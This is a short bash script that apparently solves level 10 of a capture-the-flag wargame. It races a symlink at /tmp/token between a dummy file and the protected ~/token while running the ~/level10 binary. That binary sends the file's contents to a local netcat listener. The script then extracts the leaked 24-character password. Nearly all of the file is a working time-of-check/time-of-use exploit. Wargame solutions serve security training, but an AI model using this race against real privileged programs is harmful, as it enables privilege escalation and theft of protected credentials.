#!/bin/bash
PORT="6969"
NETCAT_OUTPUT="/tmp/nc_ouput"

set -x

# Open port with netcat (l: listen, k: keep listening, d: detached)
netcat -lkd $PORT > $NETCAT_OUTPUT &

# Exploit access security hole
echo "not the token" > /tmp/isnottoken
for i in {1..100}; do
    ln -sf /tmp/isnottoken /tmp/token
    ln -sf ~/token /tmp/token
done &
for i in {1..100}; do
    ~/level10 /tmp/token 0.0.0.0
done

# kill netcat
pkill netcat

# Then read netcat output and eventually extract the password
set +x
cat $NETCAT_OUTPUT
PW=`cat $NETCAT_OUTPUT | grep --binary-files=text  -vF ".*( )*." | grep -E '^[[:print:]].{24}$' | head -1`

if [ -z "$PW" ]; then
    echo -e "\nThe script was not able to catch the password. Please retry"
else
    echo -e "\nflag10 password is: $PW\n"
fi

